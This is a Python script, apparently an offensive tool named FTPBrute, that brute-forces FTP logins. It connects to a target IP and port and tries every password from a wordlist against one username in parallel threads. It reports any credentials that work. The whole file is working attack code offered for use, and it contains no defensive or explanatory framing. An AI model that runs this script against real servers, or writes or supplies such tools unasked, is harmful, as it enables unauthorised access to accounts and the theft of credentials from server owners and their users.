import argparse
import ftplib
import threading

def getArgs():
    args=argparse.ArgumentParser(description='FTP Bruteforcer Script.',usage='python3 FTPBrute.py -i <IP> -U <username> -w <wordlist> [-p <port>] [-t <threads>]')
    args.add_argument('-i',dest='ip',help='Target IP.',required=True)
    args.add_argument('-p',dest='port',help='Target port.',default=21)
    args.add_argument('-U',dest='user',help='Username',required=True)
    args.add_argument('-w',dest='file',help='Wordlist with path.',required=True)
    args.add_argument('-t',dest='threadcount',help='Thread Counts',default=5)
    return args.parse_args()

def connect(ip,port,user,word,result):   
    ftp=ftplib.FTP()
    ftp.connect(host=ip,port=int(port),timeout=5)
    try:
        ftp.login(user=user,passwd=word)
        result.append(f'{user}:{word}')
    except ftplib.error_perm:
        pass
    ftp.quit()

def checkAlive(ip,port):
    try:
        ftp=ftplib.FTP()
        ftp.connect(host=ip,port=int(port),timeout=5)
        print('[+] Host is alive.')
        ftp.quit()
    except:
        print('[-] Host seems down.')
        exit()

def main():
    arguments=getArgs()
    ip=arguments.ip
    port=arguments.port
    user=arguments.user
    wordlist=arguments.file
    threads=[]
    result=[]
    checkAlive(ip,port)
    with open(wordlist,'r') as wordlist:
        print(f'[*] Please Wait. Bruteforcing...')
        count=0
        for word in wordlist:
            if count<int(arguments.threadcount):
                thread=threading.Thread(target=connect,args=(ip,port,user,word.rstrip(),result))
                thread.start()
                threads.append(thread)
                count+=1
            else:
                for thread in threads:
                    thread.join()
                if result!=[]:
                    for res in result:
                        print(f'[+] Credentials Valid => {res}')
                        exit()
                count=0
        if thread!=[]:
            for thread in threads:
                thread.join()
                if result!=[]:
                    for res in result:
                        print(f'[+] Credentials Valid => {res}')
                        exit()
                        
        print('[-] No Valid Credentials Found.')

if __name__=='__main__':
    main()
